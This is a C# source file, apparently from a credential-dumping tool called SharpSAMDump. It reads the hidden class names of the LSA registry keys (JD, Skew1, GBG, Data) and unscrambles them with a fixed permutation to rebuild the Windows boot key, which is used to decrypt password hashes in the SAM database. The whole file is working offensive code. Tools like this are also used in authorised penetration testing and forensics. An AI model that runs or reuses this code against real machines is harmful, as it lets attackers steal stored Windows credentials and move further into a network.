using Microsoft.Win32;

namespace SharpSAMDump
{
    public static class LSA
    {
        public static byte[] GetSecretKey()
        {
            string[] names = new string[] { "JD", "Skew1", "GBG", "Data" };
            int[] indices = new int[] { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };

            string scrambledKeyString = "";
            foreach (string name in names)
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKeyForBackup($"SYSTEM\\CurrentControlSet\\Control\\Lsa\\{name}"))
                {
                    scrambledKeyString += key.GetClassName();
                }
            }

            byte[] scrambledKeyBytes = Util.FromHexString(scrambledKeyString);

            byte[] keyBytes = new byte[indices.Length];
            for (int i=0; i<indices.Length; i++)
            {
                keyBytes[i] = scrambledKeyBytes[indices[i]];
            }

            return keyBytes;
        }
    }
}
